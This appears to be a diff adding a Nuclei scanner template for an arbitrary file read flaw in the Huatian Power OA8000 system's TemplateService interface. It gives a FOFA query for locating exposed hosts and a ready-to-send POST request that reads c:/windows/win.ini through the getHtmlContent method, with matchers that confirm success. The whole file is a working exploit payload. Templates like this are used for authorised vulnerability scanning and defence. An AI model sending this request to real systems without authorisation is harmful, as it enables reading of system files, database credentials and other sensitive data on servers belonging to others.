@@ -1,0 +1,30 @@
+id: htpower-oa-templateservice-arbitrary-file-read
+
+info:
+  name: "华天动力OA系统TemplateService接口任意文件读取"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="华天动力-OA8000"
+        华天动力OA系统中TemplateService接口存在文件路径解析逻辑缺陷，攻击者可通过精心构造的请求参数触发该缺陷，实现对目标系统中非授权文件的访问。该漏洞允许读取操作系统关键配置文件、数据库凭证及其他敏感数据，从而提升系统访问权限并扩大攻击面。
+  tags: 华天动力
+
+http:
+- raw:
+  - |
+    POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml
+
+    <buffalo-call>
+    <method>getHtmlContent</method>
+    <string>c:/windows/win.ini</string>
+    </buffalo-call>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
